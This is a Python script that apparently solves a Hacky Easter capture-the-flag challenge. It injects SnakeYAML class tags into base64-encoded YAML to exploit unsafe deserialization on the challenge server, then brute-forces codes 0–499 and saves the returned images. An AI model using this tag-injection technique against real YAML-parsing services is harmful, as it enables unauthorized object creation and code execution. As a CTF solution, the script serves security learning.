from base64 import b64encode, b64decode
import requests

def generate_payload(code):
    res = "name: Snake as a Super Hero\n"
    res += f"image: !!com.hackyeaster.digitalsnakeart.Flag [!!com.hackyeaster.digitalsnakeart.Code [ {code}] ]"
    res += """
source: DALL-E
resolution: 256x256
"""
    return b64encode(res.encode('utf-8'))

for code in range(500):
    payload = {'art': generate_payload(code)}
    r = requests.get('http://ch.hackyeaster.com:2307/art', params=payload)
    png = r.text.split('base64,')[1].split('"')[0]
    with open(f'{code:03d}.png', 'wb') as outF:
        outF.write(b64decode(png))